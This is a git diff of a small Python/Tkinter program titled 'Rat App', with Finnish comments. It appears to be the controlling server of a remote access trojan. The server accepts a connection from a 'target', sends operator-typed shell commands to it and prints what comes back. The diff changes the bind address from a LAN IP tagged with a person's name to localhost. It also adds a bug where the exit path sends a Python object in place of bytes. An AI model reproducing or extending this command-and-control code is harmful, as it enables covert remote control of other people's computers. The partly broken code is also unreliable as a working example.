@@ -10,7 +10,7 @@ class MainServer(tk.Tk):
         super().__init__()
         self.ip = ip
         self.port = port
-        self.command = Commands()
+        
         #luodaan uusi socket objekti käyttämällä socket-funktiota
         # #af_inet == ipv4, sock_stream == tcp-yhteys
         # #bindataan ip & portti -> listen == maksimiyhteydet
@@ -22,10 +22,12 @@ class MainServer(tk.Tk):
         #accept metodi palauttaa -> target == itse yhteys kohteeseen
         # # target_addr == tuple jossa index0 :ssa targetin ip ja index1:ssa väliaikaisportti
         print(f'[+] New connection from {self.client_addr[0]}')
-
+        
+        self.command = Commands(self)
 
         # configure the root window
         self.title('Rat App')
+        self.iconbitmap('rat.png')
         self.geometry('300x100+500+500')
 
         # label
@@ -42,7 +44,7 @@ class MainServer(tk.Tk):
             #encodataan stringgi byteiksi että voidaan kuljettaa kohteeseen
             command = input('>> ').encode()
             if command == b'exit':      #byteinä koska muutettiin se edellisellä rivillä
-                self.client.send(command)    #vaikka lopetetaan niin kuitenkin tieto kohteeseen
+                self.client.send(self.command)    #vaikka lopetetaan niin kuitenkin tieto kohteeseen
                 self.client.close()
                 self.s.close()
                 break
@@ -64,14 +66,10 @@ class MainServer(tk.Tk):
                 #4kilotavua (pitäisi riittää) dataa back & decodataan bytet stringeiksi
                 result = self.client.recv(4096).decode('ISO-8859-1')
                 print(result)
-
-    
-
-    
     
 
 
 if __name__ == "__main__":
-    app = MainServer('172.20.16.62', 8888)
-    app.mainloop()
+    appi = MainServer('127.0.0.1', 8888) #172.20.16.62 Jorma
+    appi.mainloop()
 
